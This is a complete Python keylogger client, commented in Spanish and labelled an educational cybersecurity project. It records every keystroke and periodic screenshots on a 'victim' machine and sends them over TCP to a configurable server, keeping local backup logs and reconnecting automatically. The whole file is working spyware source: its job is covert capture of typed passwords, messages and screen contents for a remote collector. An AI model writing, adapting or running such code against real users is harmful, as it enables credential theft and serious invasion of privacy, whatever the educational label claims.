#!/usr/bin/env python3
"""
=============================================================
  CLIENTE KEYLOGGER - Proyecto de Ciberseguridad (Educativo)
=============================================================
  Captura teclas y screenshots en la máquina "víctima".
  Envía los datos al servidor vía TCP.
  También almacena un log local de respaldo.
=============================================================
"""

import socket
import json
import io
import os
import sys
import time
import argparse
import threading
from datetime import datetime

try:
    from pynput import keyboard
except ImportError:
    print("[!] Error: Instala pynput → pip install pynput")
    sys.exit(1)

try:
    from PIL import ImageGrab
except ImportError:
    print("[!] Error: Instala Pillow → pip install Pillow")
    sys.exit(1)

# ── Configuración por defecto ──────────────────────────────
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999
SCREENSHOT_INTERVAL = 60        # Segundos entre capturas
KEY_BUFFER_FLUSH_INTERVAL = 5   # Segundos para enviar buffer de teclas
LOCAL_LOG_FILE = "local_log.txt"


class KeyloggerClient:
    """Cliente que captura teclas y screenshots y los envía al servidor."""

    def __init__(self, host, port, screenshot_interval, local_log):
        self.host = host
        self.port = port
        self.screenshot_interval = screenshot_interval
        self.local_log = local_log

        self.socket = None
        self.connected = False
        self.running = True

        # Buffer de teclas con lock para thread-safety
        self.key_buffer = []
        self.buffer_lock = threading.Lock()

    def connect(self):
        """Establece conexión TCP con el servidor."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            self.connected = True
            print(f"[+] Conectado al servidor {self.host}:{self.port}")
            return True
        except Exception as e:
            print(f"[!] Error de conexión: {e}")
            self.connected = False
            return False

    def reconnect(self):
        """Intenta reconectar al servidor con backoff exponencial."""
        delay = 5
        max_delay = 60
        while self.running and not self.connected:
            print(f"[*] Reintentando conexión en {delay}s...")
            time.sleep(delay)
            if self.connect():
                return True
            delay = min(delay * 2, max_delay)
        return False

    def send_data(self, msg_type, payload, filename=None):
        """
        Envía datos al servidor con el protocolo de header JSON + payload.
        Retorna True si se envió correctamente.
        """
        if not self.connected:
            return False

        try:
            header = {
                "type": msg_type,
                "size": len(payload),
            }
            if filename:
                header["filename"] = filename

            header_json = json.dumps(header).encode("utf-8") + b"\n"
            self.socket.sendall(header_json + payload)
            return True

        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            print(f"[!] Error de envío: {e}")
            self.connected = False
            return False

    def write_local_log(self, text):
        """Escribe teclas capturadas en el archivo local de respaldo."""
        try:
            with open(self.local_log, "a", encoding="utf-8") as f:
                ts = datetime.now().strftime("%H:%M:%S")
                f.write(f"[{ts}] {text}\n")
        except Exception as e:
            print(f"[!] Error escribiendo log local: {e}")

    # ── Captura de Teclas ──────────────────────────────────

    def on_key_press(self, key):
        """Callback para cada tecla presionada."""
        try:
            # Teclas especiales
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.shift: "[SHIFT]",
                keyboard.Key.shift_r: "[SHIFT_R]",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.esc: "[ESC]",
                keyboard.Key.up: "[↑]",
                keyboard.Key.down: "[↓]",
                keyboard.Key.left: "[←]",
                keyboard.Key.right: "[→]",
            }

            if key in special_keys:
                char = special_keys[key]
            elif hasattr(key, "char") and key.char is not None:
                char = key.char
            else:
                char = f"[{key}]"

            with self.buffer_lock:
                self.key_buffer.append(char)

        except Exception:
            pass

    def flush_key_buffer(self):
        """Envía el contenido del buffer de teclas al servidor periódicamente."""
        while self.running:
            time.sleep(KEY_BUFFER_FLUSH_INTERVAL)

            with self.buffer_lock:
                if not self.key_buffer:
                    continue
                keys_text = "".join(self.key_buffer)
                self.key_buffer.clear()

            # Guardar en log local
            self.write_local_log(keys_text)

            # Enviar al servidor
            if self.connected:
                payload = keys_text.encode("utf-8")
                if not self.send_data("keys", payload):
                    # Intentar reconectar en background
                    threading.Thread(
                        target=self.reconnect, daemon=True
                    ).start()

    # ── Capturas de Pantalla ───────────────────────────────

    def capture_screenshot(self):
        """Captura la pantalla y retorna los bytes PNG."""
        try:
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            return buffer.getvalue()
        except Exception as e:
            print(f"[!] Error capturando pantalla: {e}")
            return None

    def screenshot_loop(self):
        """Captura y envía screenshots periódicamente."""
        while self.running:
            time.sleep(self.screenshot_interval)

            img_data = self.capture_screenshot()
            if img_data is None:
                continue

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"

            print(f"[📷] Captura tomada: {filename} ({len(img_data)} bytes)")

            if self.connected:
                if not self.send_data("screenshot", img_data, filename):
                    # Guardar localmente si no se puede enviar
                    self.save_screenshot_local(img_data, filename)
                    threading.Thread(
                        target=self.reconnect, daemon=True
                    ).start()
            else:
                self.save_screenshot_local(img_data, filename)

    def save_screenshot_local(self, img_data, filename):
        """Guarda screenshot localmente si no hay conexión al servidor."""
        local_ss_dir = "local_screenshots"
        os.makedirs(local_ss_dir, exist_ok=True)
        path = os.path.join(local_ss_dir, filename)
        try:
            with open(path, "wb") as f:
                f.write(img_data)
            print(f"[💾] Screenshot guardado localmente: {path}")
        except Exception as e:
            print(f"[!] Error guardando screenshot local: {e}")

    # ── Inicio y Control ───────────────────────────────────

    def start(self):
        """Inicia el cliente keylogger."""
        print(f"\n{'='*55}")
        print(f"  CLIENTE KEYLOGGER ACTIVO")
        print(f"{'='*55}")
        print(f"  Servidor:    {self.host}:{self.port}")
        print(f"  Screenshots: cada {self.screenshot_interval}s")
        print(f"  Log local:   {self.local_log}")
        print(f"{'='*55}")

        # Conectar al servidor
        if not self.connect():
            print("[*] Ejecutando en modo offline, reintentando conexión...")
            threading.Thread(target=self.reconnect, daemon=True).start()

        # Hilo para enviar buffer de teclas
        key_flush_thread = threading.Thread(
            target=self.flush_key_buffer, daemon=True
        )
        key_flush_thread.start()

        # Hilo para capturas de pantalla
        screenshot_thread = threading.Thread(
            target=self.screenshot_loop, daemon=True
        )
        screenshot_thread.start()

        # Listener de teclado (bloquea el hilo principal)
        print("[*] Capturando teclas... (Ctrl+C para detener)\n")
        try:
            with keyboard.Listener(on_press=self.on_key_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def stop(self):
        """Detiene el cliente y cierra conexiones."""
        print("\n[*] Deteniendo cliente...")
        self.running = False

        # Enviar teclas restantes en el buffer
        with self.buffer_lock:
            if self.key_buffer:
                remaining = "".join(self.key_buffer)
                self.write_local_log(remaining)
                if self.connected:
                    self.send_data("keys", remaining.encode("utf-8"))
                self.key_buffer.clear()

        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass

        print("[*] Cliente detenido.")


def main():
    parser = argparse.ArgumentParser(
        description="Cliente Keylogger - Proyecto Educativo de Ciberseguridad"
    )
    parser.add_argument(
        "--host", default=DEFAULT_HOST,
        help=f"IP del servidor (default: {DEFAULT_HOST})"
    )
    parser.add_argument(
        "--port", "-p", type=int, default=DEFAULT_PORT,
        help=f"Puerto del servidor (default: {DEFAULT_PORT})"
    )
    parser.add_argument(
        "--interval", "-i", type=int, default=SCREENSHOT_INTERVAL,
        help=f"Intervalo de screenshots en segundos (default: {SCREENSHOT_INTERVAL})"
    )
    parser.add_argument(
        "--log", default=LOCAL_LOG_FILE,
        help=f"Archivo de log local (default: {LOCAL_LOG_FILE})"
    )

    args = parser.parse_args()

    client = KeyloggerClient(
        host=args.host,
        port=args.port,
        screenshot_interval=args.interval,
        local_log=args.log
    )

    try:
        client.start()
    except KeyboardInterrupt:
        client.stop()


if __name__ == "__main__":
    main()
